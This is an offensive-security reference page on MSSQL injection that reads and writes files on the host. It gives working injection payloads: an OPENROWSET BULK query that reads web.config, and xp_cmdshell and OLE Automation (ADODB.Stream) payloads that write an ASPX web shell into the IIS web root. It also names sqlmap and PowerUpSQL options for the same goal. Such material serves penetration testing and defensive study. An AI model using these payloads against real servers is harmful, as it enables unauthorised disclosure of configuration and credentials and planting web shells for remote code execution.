---
title: "Reading and writing files through MSSQL injection"
description: "File read and write primitives in SQL Server injection: OPENROWSET BULK for reads, and xp_cmdshell, OLE streams, and bcp for writes, with the rights each needs."
keywords:
  - OPENROWSET BULK
  - ADMINISTER BULK OPERATIONS
  - file read
  - bcp
  - xp_cmdshell write
---

# File manipulation

A privileged SQL Server login can read and write host files, which leads to source and configuration disclosure and, through writing, to web shells or scheduled-task abuse.

Reading uses `OPENROWSET` with the `BULK` provider, which needs the `ADMINISTER BULK OPERATIONS` permission (held by `sysadmin`):

```sql
' UNION SELECT BulkColumn,NULL,NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config',SINGLE_CLOB) x-- 
```

`SINGLE_CLOB` reads text, `SINGLE_NCLOB` Unicode text, and `SINGLE_BLOB` binary. On recent versions `ADMINISTER DATABASE BULK OPERATIONS` plus the right can apply, but `sysadmin` always qualifies.

Writing has several routes, all needing elevated rights. With `xp_cmdshell` enabled, redirect output to a file:

```sql
'; EXEC xp_cmdshell 'echo ^<%@ Page Language="C#"%^>... > C:\inetpub\wwwroot\s.aspx'-- 
```

OLE Automation streams write a file through a COM object when `xp_cmdshell` is unavailable:

```sql
'; DECLARE @o int; EXEC sp_OACreate 'ADODB.Stream',@o OUT; EXEC sp_OAMethod @o,'Open'; EXEC sp_OAMethod @o,'WriteText',NULL,'<shell/>'; EXEC sp_OAMethod @o,'SaveToFile',NULL,'C:\inetpub\wwwroot\s.aspx',2-- 
```

`bcp` (run via `xp_cmdshell`) also exports query results to a file. Writing to a web-served directory drops a shell that runs over HTTP; knowing the web root (read `web.config` or IIS config first) guides where the write should land. All routes require the file path to be writable by the SQL Server service account.

## Tools

- **sqlmap**: reads and writes host files with `--file-read` and `--file-write`.
- **PowerUpSQL**: helpers for OPENROWSET BULK reads and command-based file writes.

## References

- Microsoft SQL Server Documentation: OPENROWSET BULK, bcp Utility, OLE Automation
- OWASP Testing Guide: Testing for SQL Injection
